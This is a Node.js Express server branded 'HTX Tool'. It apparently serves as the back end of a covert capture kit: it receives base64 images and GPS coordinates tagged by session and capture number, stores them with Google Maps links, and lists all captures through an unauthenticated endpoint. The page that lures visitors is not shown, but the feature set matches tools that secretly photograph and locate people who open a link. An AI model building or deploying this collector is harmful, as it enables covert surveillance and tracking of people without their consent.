const express = require('express');
const multer  = require('multer');
const cors    = require('cors');
const fs      = require('fs');
const path    = require('path');

const app  = express();
const PORT = 3000;

// ─── Directory Setup ─────────────────────────────────────────────────────────
const DIRS = ['uploads', 'locations', 'logs', 'public/pdfs'];
DIRS.forEach(dir => {
  const fullPath = path.join(__dirname, dir);
  if (!fs.existsSync(fullPath)) {
    fs.mkdirSync(fullPath, { recursive: true });
    console.log(`✅ Created directory: ${dir}`);
  }
});

const LOG_FILE = path.join(__dirname, 'logs', 'upload.log');

// ─── Middleware ───────────────────────────────────────────────────────────────
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Serve uploaded images so they can be viewed in admin page
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// ─── Logging Helper ───────────────────────────────────────────────────────────
function writeLog(message) {
  const timestamp = new Date().toISOString();
  const logEntry  = `[${timestamp}] ${message}\n`;
  fs.appendFileSync(LOG_FILE, logEntry);
  console.log(logEntry.trim());
}

// ─── Multer Storage ───────────────────────────────────────────────────────────
// Removed multer since we are receiving base64 JSON payload now.

// ─── Routes ──────────────────────────────────────────────────────────────────

// Serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});



// ── POST /upload  (image + location  OR  location only) ──────────────────────
app.post('/upload', (req, res) => {
  try {
    const { image, location, captureNumber, timestamp, sessionId } = req.body;
    
    // Default location values
    let lat = 'N/A', lon = 'N/A', acc = 'N/A';
    if (location) {
      lat = location.latitude ?? 'N/A';
      lon = location.longitude ?? 'N/A';
      acc = location.accuracy ?? 'N/A';
    }

    const captureTime = timestamp || new Date().toISOString();
    let imageFilename = null;

    // Process Base64 image if it exists
    if (image && typeof image === 'string') {
      const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
      imageFilename = `capture_${Date.now()}.png`;
      fs.writeFileSync(
        path.join(__dirname, 'uploads', imageFilename),
        base64Data,
        'base64'
      );
    }

    // Save location JSON
    const locationData = {
      sessionId: sessionId || 'unknown',
      captureNumber: captureNumber || 1,
      imageFilename,
      timestamp: captureTime,
      latitude:  lat,
      longitude: lon,
      accuracy:  acc,
      googleMapsUrl: (lat !== 'N/A' && lon !== 'N/A')
        ? `https://maps.google.com/?q=${lat},${lon}`
        : 'Location not available'
    };

    const locationFilename = `location_${Date.now()}.json`;
    fs.writeFileSync(
      path.join(__dirname, 'locations', locationFilename),
      JSON.stringify(locationData, null, 2)
    );

    const type = imageFilename ? '📸 CAPTURE' : '📍 LOCATION-ONLY';
    writeLog(
      `${type} | Capture #${captureNumber || 1} | ` +
      (imageFilename ? `Image: ${imageFilename} | ` : '') +
      `Lat: ${lat} | Lon: ${lon} | Acc: ${acc}m`
    );

    res.json({
      success:      true,
      message:      imageFilename ? 'Capture saved' : 'Location saved',
      imageFile:    imageFilename,
      locationFile: locationFilename
    });

  } catch (err) {
    writeLog(`❌ Server Error: ${err.message}`);
    res.status(500).json({ success: false, message: 'Server error', error: err.message });
  }
});

// ── GET /api/captures — list all captures newest-first ───────────────────────
app.get('/api/captures', (req, res) => {
  try {
    const locDir = path.join(__dirname, 'locations');
    if (!fs.existsSync(locDir)) return res.json({ captures: [] });

    const files    = fs.readdirSync(locDir).filter(f => f.endsWith('.json')).sort().reverse();
    const captures = files.map(f => {
      try {
        return JSON.parse(fs.readFileSync(path.join(locDir, f), 'utf8'));
      } catch { return null; }
    }).filter(Boolean);

    res.json({ captures });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── GET /stats ────────────────────────────────────────────────────────────────
app.get('/stats', (req, res) => {
  try {
    const uploadsDir   = path.join(__dirname, 'uploads');
    const locationsDir = path.join(__dirname, 'locations');

    const imageCount    = fs.existsSync(uploadsDir)
      ? fs.readdirSync(uploadsDir).filter(f => f.endsWith('.jpg')).length : 0;
    const locationCount = fs.existsSync(locationsDir)
      ? fs.readdirSync(locationsDir).filter(f => f.endsWith('.json')).length : 0;

    const logContent = fs.existsSync(LOG_FILE)
      ? fs.readFileSync(LOG_FILE, 'utf8').split('\n').filter(Boolean).slice(-20) : [];

    res.json({ imageCount, locationCount, recentLogs: logContent });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ── GET /pdfs ─────────────────────────────────────────────────────────────────
app.get('/pdfs', (req, res) => {
  const pdfDir = path.join(__dirname, 'public', 'pdfs');
  try {
    const files = fs.readdirSync(pdfDir).filter(f => f.endsWith('.pdf'));
    res.json({ pdfs: files });
  } catch {
    res.json({ pdfs: [] });
  }
});

// ─── Start Server ─────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  writeLog(`🚀 HTX Tool Server started on http://localhost:${PORT}`);
  console.log(`\n  ██╗  ██╗████████╗██╗  ██╗`);
  console.log(`  ██║  ██║╚══██╔══╝╚██╗██╔╝`);
  console.log(`  ███████║   ██║    ╚███╔╝ `);
  console.log(`  ██╔══██║   ██║    ██╔██╗ `);
  console.log(`  ██║  ██║   ██║   ██╔╝ ██╗`);
  console.log(`  ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ TOOL\n`);
  console.log(`  🌐  Server  : http://localhost:${PORT}`);
  console.log(`  📁  Uploads : ./uploads/`);
  console.log(`  📍  Locations: ./locations/`);
  console.log(`  📋  Logs    : ./logs/upload.log\n`);
});
